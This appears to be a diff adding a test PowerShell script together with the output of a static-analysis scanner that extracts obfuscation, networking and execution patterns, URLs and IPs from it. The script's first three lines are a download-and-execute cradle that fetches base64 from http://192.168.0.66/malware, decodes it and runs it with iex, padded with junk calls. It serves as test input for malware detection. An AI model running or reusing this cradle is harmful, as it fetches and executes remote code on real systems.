@@ -1,0 +1,50 @@
+$b64 = $(irm -uri http://192.168.0.66/malware); sleep 0.01;sleep 0.01;Get-Process | Out-Null;
+$virus = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($b64));sleep 0.01;sleep 0.01;Measure-Object | Out-Null;
+iex $virus;
+[*] Scanning file: ./test4.ps1
+┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓
+┃ Extracted patterns about Obfuscation/Encoding in ./test4.ps1 ┃
+┡━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┩
+│                       FromBase64String                       │
+│                     System.Text.Encoding                     │
+│                        UTF8.GetString                        │
+│                        System.Convert                        │
+└──────────────────────────────────────────────────────────────┘
+┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓
+┃ Extracted patterns about Networking in ./test4.ps1 ┃
+┡━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┩
+│                        IEX                         │
+│                        -Uri                        │
+└────────────────────────────────────────────────────┘
+┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓
+┃ Extracted patterns about Execution in ./test4.ps1 ┃
+┡━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┩
+│                    Get-Process                    │
+└───────────────────────────────────────────────────┘
+
+[*] Extracting URLs from ./test4.ps1...
+┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓
+┃ Extracted URLs from ./test4.ps1 ┃
+┡━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┩
+│  http://192.168.0.66/malware);  │
+└─────────────────────────────────┘
+
+[*] Extracting Domains from ./test4.ps1...
+┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓
+┃ Extracted Domains from ./test4.ps1 ┃
+┡━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┩
+│        System.Text.Encoding        │
+│           System.Convert           │
+│           UTF8.GetString           │
+└────────────────────────────────────┘
+[!] No File Paths found in ./test4.ps1.
+
+
+[*] Extracting IP Addresses from ./test4.ps1...
+┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓
+┃ Extracted IP Addresses from ./test4.ps1 ┃
+┡━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┩
+│              192.168.0.66               │
+└─────────────────────────────────────────┘
+[!] No Files found in ./test4.ps1.
+
